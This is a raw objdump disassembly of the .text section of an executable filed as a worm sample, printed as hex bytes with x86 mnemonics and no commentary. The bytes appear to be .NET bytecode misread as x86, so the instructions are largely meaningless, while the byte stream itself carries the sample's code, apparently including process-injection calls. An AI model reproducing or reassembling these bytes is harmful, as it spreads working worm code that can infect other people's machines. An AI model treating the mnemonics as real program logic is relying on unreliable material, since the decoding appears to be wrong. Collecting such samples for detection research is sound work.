
malware_samples/worm/922fd381a1865ec3608720c8f1becbe010991c3acdc110bda388950a20f0a77e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	14 b5                	adc    $0xb5,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 c8 55 00    	add    %al,0x55c800
  402013:	00 80 5e 00 00 03    	add    %al,0x300005e(%eax)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 16                	add    %dl,(%esi)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	05 00 d4 00 00       	add    $0xd400,%eax
  402057:	00 00                	add    %al,(%eax)
  402059:	00 00                	add    %al,(%eax)
  40205b:	00 7e 17             	add    %bh,0x17(%esi)
  40205e:	00 00                	add    %al,(%eax)
  402060:	0a 72 01             	or     0x1(%edx),%dh
  402063:	00 00                	add    %al,(%eax)
  402065:	70 6f                	jo     0x4020d6
  402067:	18 00                	sbb    %al,(%eax)
  402069:	00 0a                	add    %cl,(%edx)
  40206b:	25 72 5b 00 00       	and    $0x5b72,%eax
  402070:	70 17                	jo     0x402089
  402072:	8c 47 00             	mov    %es,0x0(%edi)
  402075:	00 01                	add    %al,(%ecx)
  402077:	1a 6f 19             	sbb    0x19(%edi),%ch
  40207a:	00 00                	add    %al,(%eax)
  40207c:	0a 6f 1a             	or     0x1a(%edi),%ch
  40207f:	00 00                	add    %al,(%eax)
  402081:	0a 7e 17             	or     0x17(%esi),%bh
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 72 81             	or     -0x7f(%edx),%dh
  402089:	00 00                	add    %al,(%eax)
  40208b:	70 6f                	jo     0x4020fc
  40208d:	18 00                	sbb    %al,(%eax)
  40208f:	00 0a                	add    %cl,(%edx)
  402091:	25 72 06 01 00       	and    $0x10672,%eax
  402096:	70 17                	jo     0x4020af
  402098:	8c 47 00             	mov    %es,0x0(%edi)
  40209b:	00 01                	add    %al,(%ecx)
  40209d:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020a0:	00 00                	add    %al,(%eax)
  4020a2:	0a 25 72 3a 01 00    	or     0x13a72,%ah
  4020a8:	70 17                	jo     0x4020c1
  4020aa:	8c 47 00             	mov    %es,0x0(%edi)
  4020ad:	00 01                	add    %al,(%ecx)
  4020af:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	0a 25 72 6e 01 00    	or     0x16e72,%ah
  4020ba:	70 17                	jo     0x4020d3
  4020bc:	8c 47 00             	mov    %es,0x0(%edi)
  4020bf:	00 01                	add    %al,(%ecx)
  4020c1:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	0a 6f 1a             	or     0x1a(%edi),%ch
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	0a 73 1b             	or     0x1b(%ebx),%dh
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	0a 25 72 a6 01 00    	or     0x1a672,%ah
  4020d6:	70 6f                	jo     0x402147
  4020d8:	1c 00                	sbb    $0x0,%al
  4020da:	00 0a                	add    %cl,(%edx)
  4020dc:	25 72 bc 01 00       	and    $0x1bc72,%eax
  4020e1:	70 6f                	jo     0x402152
  4020e3:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4020e8:	17                   	pop    %ss
  4020e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ea:	1e                   	push   %ds
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  4020f3:	00 0a                	add    %cl,(%edx)
  4020f5:	28 20                	sub    %ah,(%eax)
  4020f7:	00 00                	add    %al,(%eax)
  4020f9:	0a 26                	or     (%esi),%ah
  4020fb:	73 1b                	jae    0x402118
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	0a 25 72 20 02 00    	or     0x22072,%ah
  402105:	70 6f                	jo     0x402176
  402107:	1c 00                	sbb    $0x0,%al
  402109:	00 0a                	add    %cl,(%edx)
  40210b:	25 72 30 02 00       	and    $0x23072,%eax
  402110:	70 6f                	jo     0x402181
  402112:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  402117:	17                   	pop    %ss
  402118:	6f                   	outsl  %ds:(%esi),(%dx)
  402119:	1e                   	push   %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402122:	00 0a                	add    %cl,(%edx)
  402124:	28 20                	sub    %ah,(%eax)
  402126:	00 00                	add    %al,(%eax)
  402128:	0a 26                	or     (%esi),%ah
  40212a:	de 03                	fiadds (%ebx)
  40212c:	26 de 00             	fiadds %es:(%eax)
  40212f:	2a 01                	sub    (%ecx),%al
  402131:	10 00                	adc    %al,(%eax)
  402133:	00 00                	add    %al,(%eax)
  402135:	00 00                	add    %al,(%eax)
  402137:	00 d0                	add    %dl,%al
  402139:	d0 00                	rolb   $1,(%eax)
  40213b:	03 13                	add    (%ebx),%edx
  40213d:	00 00                	add    %al,(%eax)
  40213f:	01 13                	add    %edx,(%ebx)
  402141:	30 04 00             	xor    %al,(%eax,%eax,1)
  402144:	56                   	push   %esi
  402145:	00 00                	add    %al,(%eax)
  402147:	00 01                	add    %al,(%ecx)
  402149:	00 00                	add    %al,(%eax)
  40214b:	11 72 7e             	adc    %esi,0x7e(%edx)
  40214e:	02 00                	add    (%eax),%al
  402150:	70 28                	jo     0x40217a
  402152:	03 00                	add    (%eax),%eax
  402154:	00 06                	add    %al,(%esi)
  402156:	72 90                	jb     0x4020e8
  402158:	02 00                	add    (%eax),%al
  40215a:	70 28                	jo     0x402184
  40215c:	02 00                	add    (%eax),%al
  40215e:	00 06                	add    %al,(%esi)
  402160:	0a 06                	or     (%esi),%al
  402162:	1c 6a                	sbb    $0x6a,%al
  402164:	28 21                	sub    %ah,(%ecx)
  402166:	00 00                	add    %al,(%eax)
  402168:	0a 1f                	or     (%edi),%bl
  40216a:	40                   	inc    %eax
  40216b:	12 01                	adc    (%ecx),%al
  40216d:	28 04 00             	sub    %al,(%eax,%eax,1)
  402170:	00 06                	add    %al,(%esi)
  402172:	26 19 8d 4b 00 00 01 	sbb    %ecx,%es:0x100004b(%ebp)
  402179:	25 d0 23 00 00       	and    $0x23d0,%eax
  40217e:	04 28                	add    $0x28,%al
  402180:	22 00                	and    (%eax),%al
  402182:	00 0a                	add    %cl,(%edx)
  402184:	0c 08                	or     $0x8,%al
  402186:	16                   	push   %ss
  402187:	06                   	push   %es
  402188:	08 8e 69 28 23 00    	or     %cl,0x232869(%esi)
  40218e:	00 0a                	add    %cl,(%edx)
  402190:	06                   	push   %es
  402191:	1c 6a                	sbb    $0x6a,%al
  402193:	28 21                	sub    %ah,(%ecx)
  402195:	00 00                	add    %al,(%eax)
  402197:	0a 07                	or     (%edi),%al
  402199:	12 01                	adc    (%ecx),%al
  40219b:	28 04 00             	sub    %al,(%eax,%eax,1)
  40219e:	00 06                	add    %al,(%esi)
  4021a0:	26 2a 00             	sub    %es:(%eax),%al
  4021a3:	00 1b                	add    %bl,(%ebx)
  4021a5:	30 03                	xor    %al,(%ebx)
  4021a7:	00 93 00 00 00 00    	add    %dl,0x0(%ebx)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	00 73 1b             	add    %dh,0x1b(%ebx)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	0a 25 72 20 02 00    	or     0x22072,%ah
  4021ba:	70 6f                	jo     0x40222b
  4021bc:	1c 00                	sbb    $0x0,%al
  4021be:	00 0a                	add    %cl,(%edx)
  4021c0:	25 72 30 02 00       	and    $0x23072,%eax
  4021c5:	70 6f                	jo     0x402236
  4021c7:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4021cc:	17                   	pop    %ss
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	1e                   	push   %ds
  4021cf:	00 00                	add    %al,(%eax)
  4021d1:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  4021d7:	00 0a                	add    %cl,(%edx)
  4021d9:	28 20                	sub    %ah,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	0a 26                	or     (%esi),%ah
  4021df:	73 1b                	jae    0x4021fc
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	0a 25 72 20 02 00    	or     0x22072,%ah
  4021e9:	70 6f                	jo     0x40225a
  4021eb:	1c 00                	sbb    $0x0,%al
  4021ed:	00 0a                	add    %cl,(%edx)
  4021ef:	25 72 ae 02 00       	and    $0x2ae72,%eax
  4021f4:	70 6f                	jo     0x402265
  4021f6:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4021fb:	17                   	pop    %ss
  4021fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4021fd:	1e                   	push   %ds
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402206:	00 0a                	add    %cl,(%edx)
  402208:	28 20                	sub    %ah,(%eax)
  40220a:	00 00                	add    %al,(%eax)
  40220c:	0a 26                	or     (%esi),%ah
  40220e:	73 1b                	jae    0x40222b
  402210:	00 00                	add    %al,(%eax)
  402212:	0a 25 72 20 02 00    	or     0x22072,%ah
  402218:	70 6f                	jo     0x402289
  40221a:	1c 00                	sbb    $0x0,%al
  40221c:	00 0a                	add    %cl,(%edx)
  40221e:	25 72 16 03 00       	and    $0x31672,%eax
  402223:	70 6f                	jo     0x402294
  402225:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  40222a:	17                   	pop    %ss
  40222b:	6f                   	outsl  %ds:(%esi),(%dx)
  40222c:	1e                   	push   %ds
  40222d:	00 00                	add    %al,(%eax)
  40222f:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402235:	00 0a                	add    %cl,(%edx)
  402237:	28 20                	sub    %ah,(%eax)
  402239:	00 00                	add    %al,(%eax)
  40223b:	0a 26                	or     (%esi),%ah
  40223d:	de 03                	fiadds (%ebx)
  40223f:	26 de 00             	fiadds %es:(%eax)
  402242:	2a 00                	sub    (%eax),%al
  402244:	01 10                	add    %edx,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	00 00                	add    %al,(%eax)
  40224a:	00 00                	add    %al,(%eax)
  40224c:	8f                   	(bad)
  40224d:	8f 00                	pop    (%eax)
  40224f:	03 13                	add    (%ebx),%edx
  402251:	00 00                	add    %al,(%eax)
  402253:	01 1b                	add    %ebx,(%ebx)
  402255:	30 01                	xor    %al,(%ecx)
  402257:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	00 00                	add    %al,(%eax)
  40225e:	00 00                	add    %al,(%eax)
  402260:	28 07                	sub    %al,(%edi)
  402262:	00 00                	add    %al,(%eax)
  402264:	06                   	push   %es
  402265:	26 de 03             	fiadds %es:(%ebx)
  402268:	26 de 00             	fiadds %es:(%eax)
  40226b:	2a 01                	sub    (%ecx),%al
  40226d:	10 00                	adc    %al,(%eax)
  40226f:	00 00                	add    %al,(%eax)
  402271:	00 00                	add    %al,(%eax)
  402273:	00 08                	add    %cl,(%eax)
  402275:	08 00                	or     %al,(%eax)
  402277:	03 13                	add    (%ebx),%edx
  402279:	00 00                	add    %al,(%eax)
  40227b:	01 4a 72             	add    %ecx,0x72(%edx)
  40227e:	70 03                	jo     0x402283
  402280:	00 70 28             	add    %dh,0x28(%eax)
  402283:	24 00                	and    $0x0,%al
  402285:	00 0a                	add    %cl,(%edx)
  402287:	2c 05                	sub    $0x5,%al
  402289:	28 0a                	sub    %cl,(%edx)
  40228b:	00 00                	add    %al,(%eax)
  40228d:	06                   	push   %es
  40228e:	2a 00                	sub    (%eax),%al
  402290:	1b 30                	sbb    (%eax),%esi
  402292:	04 00                	add    $0x0,%al
  402294:	1f                   	pop    %ds
  402295:	01 00                	add    %eax,(%eax)
  402297:	00 02                	add    %al,(%edx)
  402299:	00 00                	add    %al,(%eax)
  40229b:	11 72 20             	adc    %esi,0x20(%edx)
  40229e:	02 00                	add    (%eax),%al
  4022a0:	70 72                	jo     0x402314
  4022a2:	8c 03                	mov    %es,(%ebx)
  4022a4:	00 70 28             	add    %dh,0x28(%eax)
  4022a7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022ac:	72 20                	jb     0x4022ce
  4022ae:	02 00                	add    (%eax),%al
  4022b0:	70 72                	jo     0x402324
  4022b2:	0f 04                	(bad)
  4022b4:	00 70 28             	add    %dh,0x28(%eax)
  4022b7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022bc:	72 20                	jb     0x4022de
  4022be:	02 00                	add    (%eax),%al
  4022c0:	70 72                	jo     0x402334
  4022c2:	a8 04                	test   $0x4,%al
  4022c4:	00 70 28             	add    %dh,0x28(%eax)
  4022c7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022cc:	7e 26                	jle    0x4022f4
  4022ce:	00 00                	add    %al,(%eax)
  4022d0:	0a 72 43             	or     0x43(%edx),%dh
  4022d3:	05 00 70 17 6f       	add    $0x6f177000,%eax
  4022d8:	27                   	daa
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4022de:	6f                   	outsl  %ds:(%esi),(%dx)
  4022df:	28 00                	sub    %al,(%eax)
  4022e1:	00 0a                	add    %cl,(%edx)
  4022e3:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4022e8:	15 09 11 04 9a       	adc    $0x9a041109,%eax
  4022ed:	13 05 08 11 05 16    	adc    0x16051108,%eax
  4022f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f4:	29 00                	sub    %eax,(%eax)
  4022f6:	00 0a                	add    %cl,(%edx)
  4022f8:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4022fb:	58                   	pop    %eax
  4022fc:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4022ff:	04 09                	add    $0x9,%al
  402301:	8e 69 32             	mov    0x32(%ecx),%gs
  402304:	e4 de                	in     $0xde,%al
  402306:	03 26                	add    (%esi),%esp
  402308:	de 00                	fiadds (%eax)
  40230a:	72 20                	jb     0x40232c
  40230c:	02 00                	add    (%eax),%al
  40230e:	70 72                	jo     0x402382
  402310:	9f                   	lahf
  402311:	05 00 70 28 25       	add    $0x25287000,%eax
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 26                	or     (%esi),%ah
  40231a:	1f                   	pop    %ds
  40231b:	1a 28                	sbb    (%eax),%ch
  40231d:	2a 00                	sub    (%eax),%al
  40231f:	00 0a                	add    %cl,(%edx)
  402321:	72 4c                	jb     0x40236f
  402323:	06                   	push   %es
  402324:	00 70 28             	add    %dh,0x28(%eax)
  402327:	2b 00                	sub    (%eax),%eax
  402329:	00 0a                	add    %cl,(%edx)
  40232b:	0a 06                	or     (%esi),%al
  40232d:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402330:	00 0a                	add    %cl,(%edx)
  402332:	2c 07                	sub    $0x7,%al
  402334:	06                   	push   %es
  402335:	17                   	pop    %ss
  402336:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  40233c:	2e 00 00             	add    %al,%cs:(%eax)
  40233f:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  402345:	3d 09 11 04 9a       	cmp    $0x9a041109,%eax
  40234a:	13 06                	adc    (%esi),%eax
  40234c:	11 06                	adc    %eax,(%esi)
  40234e:	72 5a                	jb     0x4023aa
  402350:	06                   	push   %es
  402351:	00 70 17             	add    %dh,0x17(%eax)
  402354:	28 2f                	sub    %ch,(%edi)
  402356:	00 00                	add    %al,(%eax)
  402358:	0a 13                	or     (%ebx),%dl
  40235a:	07                   	pop    %es
  40235b:	16                   	push   %ss
  40235c:	13 08                	adc    (%eax),%ecx
  40235e:	2b 10                	sub    (%eax),%edx
  402360:	11 07                	adc    %eax,(%edi)
  402362:	11 08                	adc    %ecx,(%eax)
  402364:	9a 28 30 00 00 0a 11 	lcall  $0x110a,$0x3028
  40236b:	08 17                	or     %dl,(%edi)
  40236d:	58                   	pop    %eax
  40236e:	13 08                	adc    (%eax),%ecx
  402370:	11 08                	adc    %ecx,(%eax)
  402372:	11 07                	adc    %eax,(%edi)
  402374:	8e 69 32             	mov    0x32(%ecx),%gs
  402377:	e8 de 03 26 de       	call   0xde66275a
  40237c:	00 11                	add    %dl,(%ecx)
  40237e:	04 17                	add    $0x17,%al
  402380:	58                   	pop    %eax
  402381:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402384:	04 09                	add    $0x9,%al
  402386:	8e 69 32             	mov    0x32(%ecx),%gs
  402389:	bc 28 31 00 00       	mov    $0x3128,%esp
  40238e:	0a 6f 32             	or     0x32(%edi),%ch
  402391:	00 00                	add    %al,(%eax)
  402393:	0a 6f 33             	or     0x33(%edi),%ch
  402396:	00 00                	add    %al,(%eax)
  402398:	0a 0b                	or     (%ebx),%cl
  40239a:	72 20                	jb     0x4023bc
  40239c:	02 00                	add    (%eax),%al
  40239e:	70 72                	jo     0x402412
  4023a0:	6c                   	insb   (%dx),%es:(%edi)
  4023a1:	06                   	push   %es
  4023a2:	00 70 07             	add    %dh,0x7(%eax)
  4023a5:	72 96                	jb     0x40233d
  4023a7:	06                   	push   %es
  4023a8:	00 70 28             	add    %dh,0x28(%eax)
  4023ab:	34 00                	xor    $0x0,%al
  4023ad:	00 0a                	add    %cl,(%edx)
  4023af:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4023b5:	de 03                	fiadds (%ebx)
  4023b7:	26 de 00             	fiadds %es:(%eax)
  4023ba:	2a 00                	sub    (%eax),%al
  4023bc:	41                   	inc    %ecx
  4023bd:	4c                   	dec    %esp
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	00 00                	add    %al,(%eax)
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	30 00                	xor    %al,(%eax)
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	3b 00                	cmp    (%eax),%eax
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	6b 00 00             	imul   $0x0,(%eax),%eax
  4023cf:	00 03                	add    %al,(%ebx)
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	00 13                	add    %dl,(%ebx)
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	01 00                	add    %eax,(%eax)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 b0 00 00 00 2e    	add    %dh,0x2e000000(%eax)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 de                	add    %bl,%dh
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 03                	add    %al,(%ebx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 13                	add    %dl,(%ebx)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	01 00                	add    %eax,(%eax)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	00 1b                	add    %bl,(%ebx)
  4023f9:	01 00                	add    %eax,(%eax)
  4023fb:	00 1b                	add    %bl,(%ebx)
  4023fd:	01 00                	add    %eax,(%eax)
  4023ff:	00 03                	add    %al,(%ebx)
  402401:	00 00                	add    %al,(%eax)
  402403:	00 13                	add    %dl,(%ebx)
  402405:	00 00                	add    %al,(%eax)
  402407:	01 7a 14             	add    %edi,0x14(%edx)
  40240a:	fe 06                	incb   (%esi)
  40240c:	0c 00                	or     $0x0,%al
  40240e:	00 06                	add    %al,(%esi)
  402410:	73 35                	jae    0x402447
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 73 36             	or     0x36(%ebx),%dh
  402417:	00 00                	add    %al,(%eax)
  402419:	0a 25 17 6f 37 00    	or     0x376f17,%ah
  40241f:	00 0a                	add    %cl,(%edx)
  402421:	6f                   	outsl  %ds:(%esi),(%dx)
  402422:	38 00                	cmp    %al,(%eax)
  402424:	00 0a                	add    %cl,(%edx)
  402426:	2a 00                	sub    (%eax),%al
  402428:	13 30                	adc    (%eax),%esi
  40242a:	03 00                	add    (%eax),%eax
  40242c:	a8 00                	test   $0x0,%al
  40242e:	00 00                	add    %al,(%eax)
  402430:	03 00                	add    (%eax),%eax
  402432:	00 11                	add    %dl,(%ecx)
  402434:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  40243a:	5c                   	pop    %esp
  40243b:	00 00                	add    %al,(%eax)
  40243d:	06                   	push   %es
  40243e:	0a 7e 01             	or     0x1(%esi),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 20                	add    $0x20,%al
  402445:	a0 86 01 00 20       	mov    0x20000186,%al
  40244a:	e0 93                	loopne 0x4023df
  40244c:	04 00                	add    $0x0,%al
  40244e:	6f                   	outsl  %ds:(%esi),(%dx)
  40244f:	39 00                	cmp    %eax,(%eax)
  402451:	00 0a                	add    %cl,(%edx)
  402453:	28 3a                	sub    %bh,(%edx)
  402455:	00 00                	add    %al,(%eax)
  402457:	0a 7e 01             	or     0x1(%esi),%bh
  40245a:	00 00                	add    %al,(%eax)
  40245c:	04 20                	add    $0x20,%al
  40245e:	28 23                	sub    %ah,(%ebx)
  402460:	00 00                	add    %al,(%eax)
  402462:	20 10                	and    %dl,(%eax)
  402464:	27                   	daa
  402465:	00 00                	add    %al,(%eax)
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	39 00                	cmp    %eax,(%eax)
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	0b 06                	or     (%esi),%eax
  40246e:	28 3b                	sub    %bh,(%ebx)
  402470:	00 00                	add    %al,(%eax)
  402472:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402475:	02 07                	add    (%edi),%al
  402477:	6c                   	insb   (%dx),%es:(%edi)
  402478:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40247b:	00 0a                	add    %cl,(%edx)
  40247d:	7d 25                	jge    0x4024a4
  40247f:	00 00                	add    %al,(%eax)
  402481:	04 2b                	add    $0x2b,%al
  402483:	3b 16                	cmp    (%esi),%edx
  402485:	0d 2b 2f 06 7b       	or     $0x7b062f2b,%eax
  40248a:	26 00 00             	add    %al,%es:(%eax)
  40248d:	04 25                	add    $0x25,%al
  40248f:	2d 18 26 06 06       	sub    $0x6062618,%eax
  402494:	fe 06                	incb   (%esi)
  402496:	5d                   	pop    %ebp
  402497:	00 00                	add    %al,(%eax)
  402499:	06                   	push   %es
  40249a:	73 35                	jae    0x4024d1
  40249c:	00 00                	add    %al,(%eax)
  40249e:	0a 25 13 04 7d 26    	or     0x267d0413,%ah
  4024a4:	00 00                	add    %al,(%eax)
  4024a6:	04 11                	add    $0x11,%al
  4024a8:	04 73                	add    $0x73,%al
  4024aa:	36 00 00             	add    %al,%ss:(%eax)
  4024ad:	0a 28                	or     (%eax),%ch
  4024af:	38 00                	cmp    %al,(%eax)
  4024b1:	00 0a                	add    %cl,(%edx)
  4024b3:	09 17                	or     %edx,(%edi)
  4024b5:	58                   	pop    %eax
  4024b6:	0d 09 28 3d 00       	or     $0x3d2809,%eax
  4024bb:	00 0a                	add    %cl,(%edx)
  4024bd:	32 c9                	xor    %cl,%cl
  4024bf:	28 3b                	sub    %bh,(%ebx)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	0a 06                	or     (%esi),%al
  4024c5:	7b 25                	jnp    0x4024ec
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 28                	add    $0x28,%al
  4024cb:	3e 00 00             	add    %al,%ds:(%eax)
  4024ce:	0a 2d b3 7e 02 00    	or     0x27eb3,%ch
  4024d4:	00 04 3a             	add    %al,(%edx,%edi,1)
  4024d7:	5e                   	pop    %esi
  4024d8:	ff                   	(bad)
  4024d9:	ff                   	(bad)
  4024da:	ff 2a                	ljmp   *(%edx)
  4024dc:	1e                   	push   %ds
  4024dd:	16                   	push   %ss
  4024de:	80 02 00             	addb   $0x0,(%edx)
  4024e1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4024e4:	46                   	inc    %esi
  4024e5:	73 3f                	jae    0x402526
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  4024ef:	17                   	pop    %ss
  4024f0:	80 02 00             	addb   $0x0,(%edx)
  4024f3:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	13 30                	adc    (%eax),%esi
  4024fa:	05 00 47 00 00       	add    $0x4700,%eax
  4024ff:	00 04 00             	add    %al,(%eax,%eax,1)
  402502:	00 11                	add    %dl,(%ecx)
  402504:	02 72 9a             	add    -0x66(%edx),%dh
  402507:	06                   	push   %es
  402508:	00 70 72             	add    %dh,0x72(%eax)
  40250b:	a2 06 00 70 28       	mov    %al,0x28700006
  402510:	40                   	inc    %eax
  402511:	00 00                	add    %al,(%eax)
  402513:	0a 10                	or     (%eax),%dl
  402515:	00 02                	add    %al,(%edx)
  402517:	6f                   	outsl  %ds:(%esi),(%dx)
  402518:	41                   	inc    %ecx
  402519:	00 00                	add    %al,(%eax)
  40251b:	0a 18                	or     (%eax),%bl
  40251d:	5b                   	pop    %ebx
  40251e:	8d 4b 00             	lea    0x0(%ebx),%ecx
  402521:	00 01                	add    %al,(%ecx)
  402523:	0a 16                	or     (%esi),%dl
  402525:	0b 2b                	or     (%ebx),%ebp
  402527:	18 06                	sbb    %al,(%esi)
  402529:	07                   	pop    %es
  40252a:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40252d:	07                   	pop    %es
  40252e:	18 6f 42             	sbb    %ch,0x42(%edi)
  402531:	00 00                	add    %al,(%eax)
  402533:	0a 1f                	or     (%edi),%bl
  402535:	10 28                	adc    %ch,(%eax)
  402537:	43                   	inc    %ebx
  402538:	00 00                	add    %al,(%eax)
  40253a:	0a 9c 07 18 58 0b 07 	or     0x70b5818(%edi,%eax,1),%bl
  402541:	02 6f 41             	add    0x41(%edi),%ch
  402544:	00 00                	add    %al,(%eax)
  402546:	0a 32                	or     (%edx),%dh
  402548:	df 06                	filds  (%esi)
  40254a:	2a 00                	sub    (%eax),%al
  40254c:	1b 30                	sbb    (%eax),%esi
  40254e:	07                   	pop    %es
  40254f:	00 b8 00 00 00 05    	add    %bh,0x5000000(%eax)
  402555:	00 00                	add    %al,(%eax)
  402557:	11 02                	adc    %eax,(%edx)
  402559:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40255d:	0a 0a                	or     (%edx),%cl
  40255f:	06                   	push   %es
  402560:	6f                   	outsl  %ds:(%esi),(%dx)
  402561:	45                   	inc    %ebp
  402562:	00 00                	add    %al,(%eax)
  402564:	0a 26                	or     (%esi),%ah
  402566:	20 ff                	and    %bh,%bh
  402568:	0f 1f 00             	nopl   (%eax)
  40256b:	16                   	push   %ss
  40256c:	06                   	push   %es
  40256d:	6f                   	outsl  %ds:(%esi),(%dx)
  40256e:	46                   	inc    %esi
  40256f:	00 00                	add    %al,(%eax)
  402571:	0a 28                	or     (%eax),%ch
  402573:	0f 00 00             	sldt   (%eax)
  402576:	06                   	push   %es
  402577:	0b 07                	or     (%edi),%eax
  402579:	7e 47                	jle    0x4025c2
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 28                	or     (%eax),%ch
  40257f:	48                   	dec    %eax
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  402585:	16                   	push   %ss
  402586:	13 04 dd 80 00 00 00 	adc    0x80(,%ebx,8),%eax
  40258d:	07                   	pop    %es
  40258e:	7e 47                	jle    0x4025d7
  402590:	00 00                	add    %al,(%eax)
  402592:	0a 03                	or     (%ebx),%al
  402594:	8e 69 20             	mov    0x20(%ecx),%gs
  402597:	00 30                	add    %dh,(%eax)
  402599:	00 00                	add    %al,(%eax)
  40259b:	1f                   	pop    %ds
  40259c:	40                   	inc    %eax
  40259d:	28 10                	sub    %dl,(%eax)
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	06                   	push   %es
  4025a2:	0c 08                	or     $0x8,%al
  4025a4:	7e 47                	jle    0x4025ed
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	0a 28                	or     (%eax),%ch
  4025aa:	48                   	dec    %eax
  4025ab:	00 00                	add    %al,(%eax)
  4025ad:	0a 2c 05 16 13 04 de 	or     -0x21fbecea(,%eax,1),%ch
  4025b4:	58                   	pop    %eax
  4025b5:	07                   	pop    %es
  4025b6:	08 03                	or     %al,(%ebx)
  4025b8:	03 8e 69 12 03 28    	add    0x28031269(%esi),%ecx
  4025be:	11 00                	adc    %eax,(%eax)
  4025c0:	00 06                	add    %al,(%esi)
  4025c2:	2c 0c                	sub    $0xc,%al
  4025c4:	12 03                	adc    (%ebx),%al
  4025c6:	28 49 00             	sub    %cl,0x0(%ecx)
  4025c9:	00 0a                	add    %cl,(%edx)
  4025cb:	03 8e 69 2e 05 16    	add    0x16052e69(%esi),%ecx
  4025d1:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4025d4:	38 07                	cmp    %al,(%edi)
  4025d6:	7e 47                	jle    0x40261f
  4025d8:	00 00                	add    %al,(%eax)
  4025da:	0a 16                	or     (%esi),%dl
  4025dc:	08 7e 47             	or     %bh,0x47(%esi)
  4025df:	00 00                	add    %al,(%eax)
  4025e1:	0a 16                	or     (%esi),%dl
  4025e3:	12 05 28 12 00 00    	adc    0x1228,%al
  4025e9:	06                   	push   %es
  4025ea:	7e 47                	jle    0x402633
